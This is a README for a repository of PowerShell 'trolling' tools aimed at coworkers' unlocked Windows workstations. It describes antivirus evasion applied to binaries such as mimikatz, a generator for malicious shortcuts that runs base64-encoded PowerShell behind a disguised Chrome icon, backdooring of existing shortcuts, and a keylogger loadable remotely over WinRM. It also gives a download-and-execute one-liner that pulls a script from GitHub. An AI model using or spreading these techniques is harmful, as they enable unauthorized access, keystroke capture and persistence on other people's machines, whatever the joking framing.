# trollsrc
PoCs to share for trolling
## WARNING, THIS REPO IS FOR ADVANCED PERSISTENT TROLLS ONLY
These tools are intended to be used in a well-configured windows environment that allows for some user-level powershell execution.
Have a problem with admins leaving their workstations unlocked? Teach them a lesson by performing a benign backdoor on their primary web browser and wait :D

## .\Invoke-Dickfuscation.ps1 -target C:\mimikatz.exe
* Takes a target binary
* Bypasses most AV by overwriting the 'This program cannot be run in DOS mode' PE bytes with an ASCII cock

## .\Invoke-DickBomb.ps1 -target 8.8.8.8 -port 53 -count 3
* Sends a naughty message several times to a given socket.
* Leave some fun evidence for the DFIR guys :D

## .\make-shortcut.ps1
* Generates malicious shortcut links (chrome Icon mimicked by default)
* Takes powershell 1 liners as an optional argument; base64 encodes and executes payload when the icon is clicked

## .\bd-lnk.ps1 
* Takes a shortcut path as an argument; backdoors it with a troll message payload
* it will backdoor the link with a powershell troll msg and then redirect execution to the original application
* this will copy the source icon to $env:homepath\trollz\linkbackup\$foo.lnk for restoration
* .\bd-lnk.ps1 -sourcepath "$env:homepath\desktop\google chrome.lnk" 

## .\keyimp.ps1
* keyimp-ri.ps1 is intended for REMOTE implants, i.e. this can be run on a system via WinRM 
* keyimp.ps1 and simple-keyimp.ps1 are intended to be loaded from the target user session (unlocked workstation)
* loads up a keylogger that pops calc.exe anytime 'c' is pressed
* iex (new-object system.net.webclient).downloadstring("https://raw.githubusercontent.com/pooki3bear/trollsrc/master/keyimp.ps1")
